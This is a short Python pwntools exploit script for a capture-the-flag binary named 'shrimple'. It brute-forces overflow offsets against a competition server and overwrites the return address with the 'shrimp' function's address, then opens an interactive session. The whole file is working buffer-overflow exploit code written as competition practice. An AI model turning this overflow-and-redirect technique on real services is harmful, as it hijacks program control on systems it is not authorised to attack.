import pwn
import time

elf = pwn.context.binary = pwn.ELF('./shrimple')
#io = elf.process()

for i in range(25,50):
    io = pwn.remote('chal.competitivecyber.club',8884)
    offset = i
    print(offset)
    shrimpAddr = elf.sym['shrimp']

    payload1 = b"".join(
        [
            b"A"*offset,
            pwn.p64(shrimpAddr)
        ]
    )
    offset = offset - 1
    payload2 = b"".join(
        [
            b"A"*offset,
            pwn.p64(shrimpAddr)
        ]
    )
    offset = offset - 1
    payload3 = b"".join(
        [
            b"A"*offset,
            pwn.p64(shrimpAddr)
        ]
    )

    io.sendline(payload1)
    io.sendline(payload2)
    io.sendline(payload3)
    io.interactive()
    io.close()
    time.sleep(2)
